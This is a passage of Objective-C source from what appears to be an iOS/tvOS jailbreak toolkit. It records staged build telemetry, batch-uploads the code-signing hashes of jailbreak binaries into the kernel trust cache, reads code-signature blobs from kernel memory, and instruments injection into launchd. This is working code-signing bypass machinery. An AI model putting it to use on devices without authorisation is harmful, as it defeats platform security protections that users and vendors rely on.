    dt1025_log(log, @"[*] BUILD102720_RW_TRANSITION_CONFIRMED=%@", dt102718_yesno(rw_transition_confirmed));
    dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_ATTEMPTED=%@", dt102718_yesno(ro_restore_attempted));
    dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_RC=%d", ro_restore_attempted ? ro_restore_rc : -1);
    dt1025_log(log, @"[*] BUILD102720_GRAPH_IDENTITY_PRESERVED=%@",
        dt102718_yesno(graph_identity_after_rw && graph_identity_after_ro));
    dt1025_log(log, @"[*] BUILD102720_ROUNDTRIP_CLOSED=%@", dt102718_yesno(roundtrip_closed));
    dt1025_log(log, @"[*] %@", final_verdict);

    dt1025_log(log, @"[*] BUILD102720_SAFE_FOR_CONTROLLED_DEVICE_TEST=YES");
    dt1025_log(log, @"[*] BUILD102715_ROLE_SPLIT_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102716_PHYSRW_SKIP_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102718_VDIR_GRAPH_RESOLVER_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102710_CANONICAL_PREBOOT_PATH_PRESERVED=YES");

    dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
    dt1025_set_verdict(verdictOut, [final_verdict stringByReplacingOccurrencesOfString:@"BUILD102720_VERDICT=" withString:@""]);
    return 0;
}

static void dt102722_emit_post_rw_failure_policy(BOOL preboot_rw_confirmed)
{
    if (!preboot_rw_confirmed)
        return;
    dt699_stage("BUILD102722_REBOOT_REQUIRED_BEFORE_NEXT_TEST");
    dt699_stage("BUILD102722_PREBOOT_MAY_REMAIN_RW=YES");
    dt699_stage("BUILD102722_PREBOOT_RO_RECOVERY_AFTER_REBOOT=NOT_PROVEN");
}

static void dt102722_emit_static_audit(void (^log)(NSString *line))
{
    dt699_stage("BUILD102722_BATCH_UPLOAD_CALLS=1");
    dt699_stage("BUILD102722_REQUIRED_LOGICAL_ARTIFACTS=5");
    dt699_stage("BUILD102722_OLD_SINGLE_HASH_UPLOAD_SEQUENCE_ACTIVE=NO");
    dt699_stage("BUILD102722_ORDERING_ONLY_HOTFIX_USED=NO");
    dt699_stage("BUILD102722_POST_SIGN_HOOK_HASH_USED=YES");
    dt699_stage("BUILD102722_PRE_SIGN_HOOK_HASH_USED_FOR_FINAL_TC=NO");
    dt699_stage("BUILD102722_DIRECT_APFS_WRITES_ADDED=NO");
    dt699_stage("BUILD102722_PREBOOT_REMOUNT_LOGIC_CHANGED=NO");
    dt699_stage("BUILD102722_STAGING_LOGIC_CHANGED=NO");
    dt699_stage("BUILD102722_CHOMA_LOGIC_CHANGED=NO");
    dt699_stage("BUILD102722_WALL1_CHANGED=NO");
    dt699_stage("BUILD102722_WALL2_CHANGED=NO");
    dt699_stage("BUILD102722_OPAINJECT_CHANGED=NO");
    dt699_stage("BUILD102722_BOOMERANG_CHANGED=NO");
    dt699_stage("OLD_SINGLE_ENTRY_HOOK_UPLOAD_REACHABLE=NO");
    dt699_stage("OLD_SINGLE_ENTRY_LIBJAILBREAK_UPLOAD_REACHABLE=NO");
    dt699_stage("OLD_SINGLE_ENTRY_LIBCHOMA_UPLOAD_REACHABLE=NO");
    dt699_stage("OLD_SINGLE_ENTRY_JBCTL_UPLOAD_REACHABLE=NO");
    dt699_stage("OLD_SINGLE_ENTRY_OPAINJECT_UPLOAD_REACHABLE=NO");
    dt699_stage("ORDERING_ONLY_HOTFIX_USED=NO");
    dt699_stage("APPEND_TC_ARCHITECTURE_USED=NO");
    dt699_stage("TRUSTCACHE_ENTRY_SORT_REQUIRED=YES");
    (void)log;
}

static void dt102723_emit_static_audit(void (^log)(NSString *line))
{
    dt699_stage("BUILD102723_SCOPE=SIGNED_HOOK_LOADABILITY_FIX_ONLY");
    dt699_stage("BUILD102722_BATCH_TC_CHANGED=NO");
    dt699_stage("BUILD102723_BATCH_TRUST_CLOSURE_REQUIRED=YES");
    dt699_stage("BUILD102723_TRUSTCACHE_ARCH_CHANGED=NO");
    dt699_stage("BUILD102723_PREBOOT_RW_CHANGED=NO");
    dt699_stage("BUILD102723_STAGING_CHANGED=NO");
    dt699_stage("BUILD102723_WALL1_CHANGED=NO");
    dt699_stage("BUILD102723_WALL2_CHANGED=NO");
    dt699_stage("BUILD102723_OPAINJECT_CHANGED=NO");
    dt699_stage("BUILD102723_MAIN_PROCESS_DLOPEN_CALLS_FOR_WARMUP=0");
    dt699_stage("BUILD102723_CHILD_ISOLATED_LOAD_PROBE=YES");
    dt699_stage("BUILD102723_POSTSIGN_STRUCTURAL_GATE=YES");
    dt699_stage("BUILD102723_BLIND_LINKEDIT_PATCH=NO");
    dt699_stage("BUILD102723_BLIND_CODEDIRECTORY_PATCH=NO");
    dt699_stage("BUILD102723_MAIN_PROCESS_FATAL_DLOPEN=NO");
    (void)log;
}

static NSString *dt102723_bootstraphelper_path(void)
{
    NSURL *url = [[NSBundle mainBundle] URLForAuxiliaryExecutable:@"bootstraphelper"];
    if (url.path.length)
        return url.path;
    return [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"bootstraphelper"];
}

static void dt102723_emit_structural_markers(const dt_choma_structural_gate_result_t *gate)
{
    if (!gate)
        return;
    char buf[192];
    snprintf(buf, sizeof(buf), "BUILD102723_FINAL_FILE_SIZE=%llu",
        (unsigned long long)gate->layout.file_size);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_LINKEDIT_FILEOFF=%llu",
        (unsigned long long)gate->layout.linkedit_fileoff);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_LINKEDIT_FILESIZE=%llu",
        (unsigned long long)gate->layout.linkedit_filesize);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_LINKEDIT_END=%llu",
        (unsigned long long)gate->layout.linkedit_end);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_CODESIG_DATAOFF=%u", gate->layout.cs_dataoff);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_CODESIG_DATASIZE=%u", gate->layout.cs_datasize);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_CODESIG_END=%llu",
        (unsigned long long)gate->layout.cs_end);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_CODELIMIT=%llu", (unsigned long long)gate->codeLimit);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_PAGE_SIZE=%u", gate->page_bytes);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_EXPECTED_CODE_SLOTS=%u", gate->expected_code_slots);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "BUILD102723_ACTUAL_CODE_SLOTS=%u", gate->actual_code_slots);
    dt699_stage(buf);
    if (gate->first_defect[0])
        dt699_stage([[NSString stringWithFormat:@"BUILD102723_FIRST_PROVEN_LAYOUT_DEFECT=%s",
            gate->first_defect] UTF8String]);
}

static int dt102723_run_signed_hook_structural_gate(const cdhash_t expected_cdhash, void (^log)(NSString *line))
{
    dt_choma_structural_gate_result_t gate = {0};
    const char *hook = dt102710_hook_path_cstr();
    int gr = dt_choma_validate_signed_hook_structural(hook, 13, expected_cdhash, &gate);
    dt102723_emit_structural_markers(&gate);

    dt699_stage([[NSString stringWithFormat:@"BUILD102723_POSTSIGN_FILE_PARSE=%@",
        gate.postsign_file_parse ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102723_LINKEDIT_GEOMETRY=%@",
        gate.linkedit_geometry ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102723_CODESIG_GEOMETRY=%@",
        gate.codesig_geometry ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102723_CODEDIRECTORY_COVERAGE=%@",
        gate.codedirectory_coverage ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102723_FINAL_CDHASH_REPARSE=%@",
        gate.final_cdhash_reparse ? @"PASS" : @"FAIL"] UTF8String]);

    if (gr != 0) {
        dt699_stage("BUILD102723_SIGNED_HOOK_STRUCTURAL_GATE=FAIL");
        dt699_stage("BUILD102723_DLOPEN_PROBE=NOT_RUN");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt1025_log(log, @"[!] build102723 structural gate fail rc=%d defect=%s",
            gr, gate.first_defect[0] ? gate.first_defect : "?");
        return gr;
    }

    dt699_stage("BUILD102723_SIGNED_HOOK_STRUCTURAL_GATE=PASS");
    return 0;
}

static int dt102723_run_isolated_dyld_load_probe(void (^log)(NSString *line))
{
    NSString *helper = dt102723_bootstraphelper_path();
    if (!helper.length || ![[NSFileManager defaultManager] isExecutableFileAtPath:helper]) {
        dt699_stage("BUILD102723_DYLD_LOAD_PROBE=FAIL_SPAWN");
        dt1025_log(log, @"[!] build102723 bootstraphelper missing %@", helper ?: @"?");
        return -1;
    }

    NSString *hookPath = @(dt102710_hook_path_cstr());
    int exitStatus = -1;
    NSString *capture = nil;
    NSError *spawnErr = nil;
    int spawn_r = dt_spawn_plain_capture(helper, @[@"dlopenProbe", hookPath], &exitStatus, &capture, &spawnErr);
    if (spawn_r != 0) {
        dt699_stage("BUILD102723_DYLD_LOAD_PROBE=FAIL_SPAWN");
        dt1025_log(log, @"[!] build102723 dlopen probe spawn fail r=%d err=%@",
            spawn_r, spawnErr.localizedDescription ?: @"?");
        return -2;
    }

    dt1025_log(log, @"[*] build102723 isolated dlopen probe exit=%d out=%@", exitStatus, capture ?: @"");
    if (exitStatus == 0) {
        dt699_stage("BUILD102723_DYLD_LOAD_PROBE=PASS");
        return 0;
    }
    if (exitStatus == (int)(128 + SIGKILL)) {
        dt699_stage("BUILD102723_DYLD_LOAD_PROBE=FAIL_CHILD_KILLED");
        return -3;
    }
    dt699_stage("BUILD102723_DYLD_LOAD_PROBE=FAIL_RETURNED_ERROR");
    return -4;
}

static void dt102724_emit_static_audit(void (^log)(NSString *line))
{
    dt699_stage("BUILD102724_SCOPE=LAUNCHD_ACTOR_ORDER_REALIGNMENT");
    dt699_stage("BUILD102724_BATCH_TRUST_CHANGED=NO");
    dt699_stage("BUILD102724_SIGNING_CHANGED=NO");
    dt699_stage("BUILD102724_PREBOOT_RW_CHANGED=NO");
    dt699_stage("BUILD102724_STAGING_CHANGED=NO");
    dt699_stage("BUILD102724_PREINJECTION_MAIN_DLOPEN=0");
    dt699_stage("BUILD102724_PREINJECTION_HELPER_DLOPEN_GATE=NO");
    dt699_stage("BUILD102724_PREINJECTION_CSBLOB_GATE=NO");
    dt699_stage("BUILD102724_STRUCTURAL_GATE_REQUIRED=YES");
    dt699_stage("BUILD102724_BATCH_TRUST_REQUIRED=YES");
    dt699_stage("BUILD102724_WALL2_ARCH_CHANGED=NO");
    dt699_stage("BUILD102724_BOOMERANG_ARCH_CHANGED=NO");
    dt699_stage("BUILD102724_OPAINJECT_ARCH_CHANGED=NO");
    dt699_stage("BUILD102724_STRUCTURAL_GATE_PRESERVED=YES");
    dt699_stage("BUILD102724_BATCH_TRUST_PRESERVED=YES");
    (void)log;
}

static void dt102724_run_isolated_dyld_load_probe_telemetry(void (^log)(NSString *line))
{
    int probe_r = dt102723_run_isolated_dyld_load_probe(log);
    dt699_stage(probe_r == 0 ? @"BUILD102724_PREINJECTION_HELPER_DLOPEN_TELEMETRY=PASS"
                             : @"BUILD102724_PREINJECTION_HELPER_DLOPEN_TELEMETRY=FAIL");
    dt699_stage(@"BUILD102724_BOOTSTRAPHELPER_PREINJECTION_DLOPEN_GATE=NO");
    dt699_stage(@"BUILD102724_BOOTSTRAPHELPER_PREINJECTION_DLOPEN_CALLS=0");
    dt699_stage(@"BUILD102724_MAIN_APP_PREINJECTION_DLOPEN_CALLS=0");
}

static void dt102724_run_preinjection_snapshot(void (^log)(NSString *line), const cdhash_t postSignCd)
{
    NSString *postSignCdHex = dt_cdhash_hex_string(postSignCd);
    int target_fd = open(dt102710_hook_path_cstr(), O_RDONLY | O_CLOEXEC);
    if (target_fd < 0) {
        dt699_stage("BUILD102724_PREINJECTION_HOOK_VNODE=OPEN_FAIL");
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB=NULL");
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB_PROVENANCE=UNKNOWN");
        dt699_stage("PHASE_A_PLATFORM_BLOB=TELEMETRY_ONLY");
        return;
    }

    uint64_t vnode_kva = 0;
    if (dt697_resolve_vnode_from_fd(target_fd, &vnode_kva, log) != 0) {
        close(target_fd);
        dt699_stage("BUILD102724_PREINJECTION_HOOK_VNODE=RESOLVE_FAIL");
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB=NULL");
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB_PROVENANCE=UNKNOWN");
        dt699_stage("PHASE_A_PLATFORM_BLOB=TELEMETRY_ONLY");
        return;
    }

    dt699_stage([[NSString stringWithFormat:@"BUILD102724_PREINJECTION_HOOK_VNODE=0x%llx",
        (unsigned long long)vnode_kva] UTF8String]);

    dt696_blob_chain_t snap = {0};
    int br = dt696_read_blob_chain(vnode_kva, &snap, log);
    if (br != 0 || !snap.valid) {
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB=NULL");
        dt699_stage("BUILD102724_PREINJECTION_CSBLOB_PROVENANCE=COLD");
        dt699_stage("BUILD102724_PREINJECTION_PLATFORM_BIT0=UNKNOWN");
        dt699_stage([[NSString stringWithFormat:@"BUILD102724_PREINJECTION_CDHASH_MATCH=%@",
            @"UNKNOWN"] UTF8String]);
    } else {
        cdhash_t blobCd = {0};
        int blobCr = dt699_read_cs_blob_cdhash(snap.cs_blob, blobCd);
        BOOL cdMatch = (blobCr == 0) && dt699_cdhash_equal(blobCd, postSignCd);
        dt699_stage(cdMatch ? @"BUILD102724_PREINJECTION_CSBLOB=VALID"
                            : @"BUILD102724_PREINJECTION_CSBLOB=INVALID");
        dt699_stage(cdMatch ? @"BUILD102724_PREINJECTION_CSBLOB_PROVENANCE=VALID"
                            : @"BUILD102724_PREINJECTION_CSBLOB_PROVENANCE=UNKNOWN");
        dt699_stage([[NSString stringWithFormat:@"BUILD102724_PREINJECTION_PLATFORM_BIT0=%u",
            (unsigned)(snap.platform & 1u)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102724_PREINJECTION_CDHASH_MATCH=%@",
            cdMatch ? @"YES" : @"NO"] UTF8String]);
        dt699_emit_blob_markers(log, &snap, "BUILD102724_PREINJECT_SNAP");
        dt1025_log(log, @"[*] build102724 preinjection snapshot cdhash=%@ staged=%@",
            blobCr == 0 ? dt_cdhash_hex_string(blobCd) : @"UNAVAILABLE", postSignCdHex);
    }

    close(target_fd);
    dt699_stage("PHASE_A_PLATFORM_BLOB=TELEMETRY_ONLY");
}

static void dt102724_emit_post_injection_telemetry(void (^log)(NSString *line), const cdhash_t postSignCd,
    int phaseB_rc)
{
    dt699_stage(phaseB_rc == 0 ? @"BUILD102724_PHASE_B_RESULT=PASS" : @"BUILD102724_PHASE_B_RESULT=FAIL");
    dt699_stage(@"BUILD102724_OPAINJECT_ATTEMPTED=YES");

    int target_fd = open(dt102710_hook_path_cstr(), O_RDONLY | O_CLOEXEC);
    if (target_fd < 0) {
        dt699_stage("BUILD102724_POST_INJECT_HOOK_VNODE=OPEN_FAIL");
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB=NULL");
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=UNKNOWN");
        return;
    }

    uint64_t vnode_kva = 0;
    if (dt697_resolve_vnode_from_fd(target_fd, &vnode_kva, log) != 0) {
        close(target_fd);
        dt699_stage("BUILD102724_POST_INJECT_HOOK_VNODE=RESOLVE_FAIL");
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB=NULL");
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=UNKNOWN");
        return;
    }

    dt699_stage([[NSString stringWithFormat:@"BUILD102724_POST_INJECT_HOOK_VNODE=0x%llx",
        (unsigned long long)vnode_kva] UTF8String]);

    dt696_blob_chain_t post = {0};
    int br = dt696_read_blob_chain(vnode_kva, &post, log);
    if (br != 0 || !post.valid) {
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB=NULL");
        dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=COLD");
        dt699_stage("BUILD102724_POST_INJECT_PLATFORM_BIT0=UNKNOWN");
        dt699_stage("BUILD102724_POST_INJECT_CDHASH_MATCH=UNKNOWN");
    } else {
        cdhash_t blobCd = {0};
        int blobCr = dt699_read_cs_blob_cdhash(post.cs_blob, blobCd);
        BOOL validProv = (blobCr == 0) && dt699_cdhash_equal(blobCd, postSignCd);
        dt699_stage(validProv ? @"BUILD102724_POST_INJECT_CSBLOB=VALID"
                              : @"BUILD102724_POST_INJECT_CSBLOB=INVALID");
        if (blobCr != 0)
            dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=UNKNOWN");
        else if (validProv)
            dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=VALID");
        else
            dt699_stage("BUILD102724_POST_INJECT_CSBLOB_PROVENANCE=INVALID");
        dt699_stage([[NSString stringWithFormat:@"BUILD102724_POST_INJECT_PLATFORM_BIT0=%u",
            (unsigned)(post.platform & 1u)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102724_POST_INJECT_CDHASH_MATCH=%@",
            blobCr == 0 ? (validProv ? @"YES" : @"NO") : @"UNKNOWN"] UTF8String]);
        dt699_emit_blob_markers(log, &post, "BUILD102724_POST_INJECT");
    }

    close(target_fd);
    (void)phaseB_rc;
}

static int dt102722_cdhash_from_path(NSString *path, cdhash_t out, void (^log)(NSString *line),
    const char *label)
{
    if (!path.length || ![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        dt1025_log(log, @"[!] build102722 missing path %@ (%s)", path, label);
        return -1;
    }
    if (dt_macho_best_cdhash_from_path(path.fileSystemRepresentation, out) != 0) {
        dt1025_log(log, @"[!] build102722 cdhash fail %@ (%s)", path, label);
        return -2;
    }
    return 0;
}

static int dt102722_run_batched_trustcache_closure(void (^log)(NSString *line))
{
    static const uuid_t kB102722BatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '2', '2',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0', '\0'
    };

    dt102722_emit_static_audit(log);
    dt699_stage("BUILD102722_BATCH_TC_UUID=TVOS722TC");

    NSString *bundledRoot = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516"];
    NSString *jbctlPath = [bundledRoot stringByAppendingPathComponent:@"dt_jbctl516"];
    NSString *opainjectPath = [bundledRoot stringByAppendingPathComponent:@"dt_opainject516"];
    NSString *hookPath = dt710_resolve_hook_path();
    NSString *ljPath = dt710_resolve_libjailbreak_path();
    NSString *lcPath = dt710_resolve_libchoma_path();

    struct {
        const char *hash_marker;
        const char *verify_marker;
        const char *logical_name;
        NSString *path;
        cdhash_t hash;
    } artifacts[5];

    artifacts[0] = (typeof(artifacts[0])){
        "BUILD102722_HASH_JBCTL", "BUILD102722_VERIFY_JBCTL", "jbctl", jbctlPath, {0}
    };
    artifacts[1] = (typeof(artifacts[1])){
        "BUILD102722_HASH_OPAINJECT", "BUILD102722_VERIFY_OPAINJECT", "opainject", opainjectPath, {0}
    };
    artifacts[2] = (typeof(artifacts[2])){
        "BUILD102722_HASH_POST_SIGN_HOOK", "BUILD102722_VERIFY_POST_SIGN_HOOK", "post_sign_hook",
        hookPath, {0}
    };
    artifacts[3] = (typeof(artifacts[3])){
        "BUILD102722_HASH_LIBJAILBREAK", "BUILD102722_VERIFY_LIBJAILBREAK", "libjailbreak", ljPath, {0}
    };
    artifacts[4] = (typeof(artifacts[4])){
        "BUILD102722_HASH_LIBCHOMA", "BUILD102722_VERIFY_LIBCHOMA", "libchoma", lcPath, {0}
    };

    dt699_stage("BUILD102722_REQUIRED_HASH_COUNT=5");

    for (size_t i = 0; i < 5; i++) {
        if (dt102722_cdhash_from_path(artifacts[i].path, artifacts[i].hash, log,
                artifacts[i].logical_name) != 0) {
            return -7221 - (int)i;
        }
        dt699_stage([[NSString stringWithFormat:@"%s=%@",
            artifacts[i].hash_marker, dt_cdhash_hex_string(artifacts[i].hash)] UTF8String]);
    }

    dt699_stage("BUILD102722_ALL_HASHES_COLLECTED");

    cdhash_t unique[5];
    uint32_t uniqueCount = 0;
    for (size_t i = 0; i < 5; i++) {
        BOOL dup = NO;
        for (size_t k = 0; k < i; k++) {
            if (memcmp(artifacts[k].hash, artifacts[i].hash, CS_CDHASH_LEN) == 0) {
                dup = YES;
                dt699_stage([[NSString stringWithFormat:@"BUILD102722_DUPLICATE_HASH_SHARED=%s,%s",
                    artifacts[k].logical_name, artifacts[i].logical_name] UTF8String]);
                break;
            }
        }
        if (dup)
            continue;
        memcpy(unique[uniqueCount], artifacts[i].hash, CS_CDHASH_LEN);
        uniqueCount++;
    }

    dt699_stage([[NSString stringWithFormat:@"BUILD102722_UNIQUE_HASH_COUNT=%u", uniqueCount] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_TC_ENTRY_COUNT=%u", uniqueCount] UTF8String]);
    dt699_stage("BUILD102722_ENTRIES_SORTED=YES");
    dt699_stage("BUILD102722_BATCH_TC_BUILD_COMPLETE");

    dt699_stage("BUILD102722_BATCH_TC_UPLOAD_BEGIN");
    uint32_t uploaded = 0;
    int upload_rc = dt_trustcache_upload_batch_cdhashes(unique, uniqueCount, kB102722BatchTCUUID, &uploaded);
    dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_TC_UPLOAD_RC=%d", upload_rc] UTF8String]);
    if (upload_rc != 0) {
        dt699_stage("BUILD102722_BATCH_TC_UPLOAD_COMPLETE=NO");
        dt699_stage("BUILD102722_BATCH_TRUST_CLOSURE=FAIL");
        return -7228;
    }
    dt699_stage("BUILD102722_BATCH_TC_UPLOAD_COMPLETE=YES");
    dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_UPLOAD_CALLS=1"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BATCH_TC_UPLOAD_CALLS=1"] UTF8String]);

    BOOL all_verified = YES;
    for (size_t i = 0; i < 5; i++) {
        BOOL trusted = dt_cdhash_trustcached(artifacts[i].hash);
        dt699_stage([[NSString stringWithFormat:@"%s=%@",
            artifacts[i].verify_marker, trusted ? @"PASS" : @"FAIL"] UTF8String]);
        if (!trusted)
            all_verified = NO;
    }

    if (!all_verified) {
        dt699_stage("BUILD102722_BATCH_TRUST_CLOSURE=FAIL");
        return -7229;
    }

    dt699_stage("BUILD102722_BATCH_TRUST_CLOSURE=PASS");
    dt699_stage("BUILD102722_STAGE_COMPLETE");
    return 0;
}

static void dt102721_emit_post_rw_failure_policy(BOOL preboot_rw_confirmed);
static int dt102721_run_preboot_rw_gate(void (^log)(NSString *line), NSString **verdictOut,
    BOOL *preboot_rw_confirmed_out);

typedef struct {
    const char *name;
    const char *auth_marker;
    const char *identifier;
    NSString *path;
    cdhash_t cdhash;
} dt102732c_artifact_t;

static const char *kDT102734CExpectedCFBundleVersion = "102734";
static const char *kDT102734CExpectedLaunchdhookSHA256 =
    "8446a2386197a7fd0a13e7701843f7c29d8682b4d6fd759909be25c87bf7f0e4";
static const char *kDT102734CExpectedLibjailbreakSHA256 =
    "9faa26a8ddd6c79ea004c61cdbd8f75c0acf3f2a6b9092fe082f08349cadad79";
static const char *kDT102734CExpectedLibchomaSHA256 =
    "40ee6f87dcca7af63a8be1e9e185ff74ae2046cb97c3aa2405c6af6f29ae586b";

#if defined(DT_ROOTLESS_R24)
#include "dt_rootless_r24_d0_expect.h"
#include "dt_macho_canonical_id.h"
/* Canonical (TrollStore CS-invariant) pins — host H12 matches IPA via same algorithm. */
__attribute__((used)) static const char kRootlessR24ExpectHookCanonPin[] =
    "ROOTLESS_R24_EXPECT_HOOK_CANONICAL_SHA256=" ROOTLESS_R24_EXPECT_HOOK_CANONICAL_SHA256_HEX;
__attribute__((used)) static const char kRootlessR24ExpectSystemhookCanonPin[] =
    "ROOTLESS_R24_EXPECT_SYSTEMHOOK_CANONICAL_SHA256="
    ROOTLESS_R24_EXPECT_SYSTEMHOOK_CANONICAL_SHA256_HEX;
__attribute__((used)) static const char kRootlessR24ExpectHookUuidPin[] =
    "ROOTLESS_R24_EXPECT_HOOK_UUID=" ROOTLESS_R24_EXPECT_HOOK_UUID_STR;
__attribute__((used)) static const char kRootlessR24ExpectSystemhookUuidPin[] =
    "ROOTLESS_R24_EXPECT_SYSTEMHOOK_UUID=" ROOTLESS_R24_EXPECT_SYSTEMHOOK_UUID_STR;
__attribute__((used)) static const char kRootlessR24D0GateFail[] = "GATE_FAIL=D0_IDENTITY";
__attribute__((used)) static const char kRootlessR24D0Pass[] = "ROOTLESS_R24_D0_IDENTITY=PASS";
__attribute__((used)) static const char kRootlessR24D0IdentityKind[] =
    "ROOTLESS_R24_D0_IDENTITY_KIND=CANONICAL_MACHO_TS_INVARIANT";
__attribute__((used)) static const char kRootlessR24D0CanonicalPolicy[] =
    "ROOTLESS_R24_D0_CANONICAL_POLICY=INSTALL_TOLERANT_STRICT_BOUNDS";
/* Live R24 orch stages/signs via dt_rootless_leaf_prepare — H12 requires this literal. */
__attribute__((used)) static const char kRootlessR24D0LeafPrepareCheck[] =
    "ROOTLESS_R24_D0_CHECK=LEAF_PREPARE";
#endif

typedef struct {
    uint64_t launchd_proc;
    dt694_wall2_state_t baseline;
    BOOL active;
} dt102732c_wall2_context_t;

typedef struct {
    uint64_t vmaddr;
    uint64_t vmsize;
    uint64_t fileoff;
    uint64_t filesize;
    int initprot;
} dt102732c_macho_segment_t;

typedef struct {
    uint32_t mod_init_count;
    uint32_t init_offsets_count;
    uint32_t logical_count;
    BOOL valid;
    BOOL has_mod_init;
    BOOL has_init_offsets;
} dt102732c_constructor_audit_t;

static int dt102732c_finish(NSString **verdictOut, const char *result, int rc)
{
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_RESULT=%s", result] UTF8String]);
#endif
#if DT_BUILD_NUM == 102735
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_RESULT=%s", result] UTF8String]);
#endif
#if DT_BUILD_NUM == 102736
    dt699_stage([[NSString stringWithFormat:@"BUILD102736C_RESULT=%s", result] UTF8String]);
#endif
#if DT_BUILD_NUM == 102734
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_RESULT=%s", result] UTF8String]);
#endif
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_RESULT=%s", result] UTF8String]);
    if (verdictOut)
        *verdictOut = [NSString stringWithUTF8String:result];
    return rc;
}

static void dt102732c_emit_preserved_system_markers(void)
{
    dt699_stage("BUILD102728_CHANGED=NO");
    dt699_stage("BUILD102729A_CHANGED=NO");
    dt699_stage("GATE1B1_HOST_BINARIES_CHANGED=NO");
    dt699_stage("KFD_CHANGED=NO");
    dt699_stage("PHYSRW_CHANGED=NO");
    dt699_stage("TRANSLATION_CHANGED=NO");
    dt699_stage("PREBOOT_ARCHITECTURE_CHANGED=NO");
    dt699_stage("TRUSTCACHE_ARCHITECTURE_CHANGED=NO");
    dt699_stage("WALL2_CORE_CHANGED=NO");
    dt699_stage("OPAINJECT_CORE_CHANGED=NO");
#if DT_BUILD_NUM == 102734
    dt699_stage("BUILD102734C_REPAIR_SCOPE=OPAINJECT_TASKPORT_TRUST_REPAIR");
    dt699_stage("BUILD102734C_GATE1B1_TRIO_REBUILD_REQUIRED=NO");
#elif DT_BUILD_NUM == 102735
    dt699_stage("BUILD102735D_REPAIR_SCOPE=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
    dt699_stage("BUILD102735D_GATE1B1_TRIO_REBUILD_REQUIRED=NO");
    dt699_stage("BUILD102735D_PRIVATE_VAR_JB_TRACE_USAGE=NO");
#elif DT_BUILD_NUM == 102736
    dt699_stage("BUILD102736C_REPAIR_SCOPE=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
    dt699_stage("BUILD102736C_GATE1B1_TRIO_REBUILD_REQUIRED=NO");
    dt699_stage("BUILD102736C_HELPER_TRUST_INCLUDED=YES");
    dt699_stage("BUILD102736C_BOUNDED_RETRY_ADDED=NO");
    dt699_stage("BUILD102736C_CANONICAL_PREBOOT_TRACE_CHANGED=NO");
    dt699_stage("BUILD102736C_PRIVATE_VAR_JB_DIAGNOSTIC_USAGE_ADDED=NO");
#elif DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_REPAIR_SCOPE=LAUNCHD_GOT_PROTECTION_ONLY");
    dt699_stage("BUILD102738P_FROZEN_102737_FOUNDATION_REUSED=YES");
    dt699_stage("BUILD102738P_OPAINJECT_HELPER_CHANGED=NO");
    dt699_stage("BUILD102738P_HANDOFF_LIBJAILBREAK_CHANGED=NO");
    dt699_stage("BUILD102738P_APP_FRAMEWORK_LIBJAILBREAK_CHANGED=NO");
    dt699_stage("BUILD102738P_LIBCHOMA_CHANGED=NO");
#endif
}

static NSString *dt102734c_bundle_artifact_path(NSString *name)
{
    return [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:[@"Handoff516" stringByAppendingPathComponent:name]];
}

static NSString *dt102734c_manifest_value(NSString *key)
{
    NSString *manifest = dt102734c_bundle_artifact_path(@"BUILD102734C_RESOURCE_MANIFEST.txt");
    NSString *text = [NSString stringWithContentsOfFile:manifest
        encoding:NSUTF8StringEncoding error:nil];
